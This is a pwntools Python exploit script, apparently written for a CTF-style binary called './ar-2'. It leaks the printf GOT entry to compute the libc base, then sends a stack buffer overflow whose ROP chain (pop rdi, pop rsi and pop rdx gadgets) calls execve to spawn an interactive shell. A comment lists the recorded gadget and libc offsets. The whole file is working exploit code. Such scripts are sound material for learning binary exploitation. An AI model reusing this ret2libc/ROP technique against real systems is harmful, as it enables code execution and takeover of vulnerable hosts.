#!/usr/bin/env python
from pwn import *

p = process("./ar-2")

#context.terminal = ['tmux', 'splitw', '-h']
# this will spawn gdb for you (remove this if you do not want gdb)
#gdb.attach(p)

got_of_printf = p.elf.got['printf']
printf_at_plt = p.elf.plt['printf']
input_func = p.elf.symbols['input_func']

print("Got of printf %s" % hex(got_of_printf))
print("Printf@plt %s" % hex(printf_at_plt))
print("input_func() %s" % hex(input_func))

p.recv()
p.sendline('8')

p.recv()
p.sendline(hex(got_of_printf))

p.recv(30)
data = p.recv(8)
data = u64(data)
data &= 0x0000ffffffffffff
print(hex(data))

libc_base = data - 0x55800
libc_execve = libc_base + 0xcc770

pop_rdi = p64(0x400a33)
pop_rsi = p64(0x400a31)
pop_rdx = p64(libc_base + 0x1b92)

buf = "A" * 0x80 + "B" * 8
buf += pop_rdi
buf += p64(0x400020)
buf += pop_rsi
buf += p64(0)
buf += p64(0)
buf += pop_rdx
buf += p64(0)
buf += p64(libc_execve)

"""
libc base: 0x7fdf103d6000       0x55800 from printf
execve: 0x7fdf104a2770          0xcc770 from libc_base
execl: 0x7fdf104a2a20
printf: 0x7fdf1042b800

0x0000000000400a33 : pop rdi ; ret
0x0000000000400a31 : pop rsi ; pop r15 ; ret
0x0000000000001b92 : pop rdx ; ret offset from lib5"
"""

p.sendline(buf)
p.interactive()
